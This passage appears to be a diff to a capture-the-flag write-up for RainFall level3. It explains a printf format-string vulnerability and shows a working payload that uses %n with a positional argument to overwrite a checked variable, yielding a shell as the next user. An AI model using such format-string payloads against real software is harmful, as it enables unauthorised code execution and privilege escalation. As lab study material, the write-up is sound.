@@ -47,6 +47,26 @@ level3@RainFall:~$ objdump -d level3 | grep "main>:" -A 10
 
 # This program is not vulnerable to buffer overflows, because there is a limit
 # pushed on the stack before the call to fgets().
-# We can see that a check is performed at the address 0x804988c.
-# If the value 0x40 is found there, the program writes 'Wait, what !' on stdout
+# We can see that a check is performed against the variable
+# at the address 0x804988c.
+# If it is equal 0x40, the program writes 'Wait, what !' on stdout
 # then spawns a shell.
+# We can also see that the buffer is passed as the sole argument to printf.
+# This indicates a format string exploit.
+# We can abuse the fact that the user controls the content of the format
+# string of printf to write an arbitrary int value somewhere in the memory,
+# thanks to the %n flag.
+# This flag will write the amount of bytes already counted in the input at the
+# memory location directly present on the stack.
+# We can also use printf's positional argument syntax to directly reference
+# the nth element starting from $esp.
+# Knowing all this, we can craft the malicious format string :
+
+level3@RainFall:~$ python -c "import struct;
+> target = struct.pack('I', 0x804988c)
+> print target + '%60x' + '%4$n'" > /tmp/payload
+level3@RainFall:~$ cat /tmp/payload - | ./level3
+�                                                         200%4
+Wait what?!
+whoami
+level4
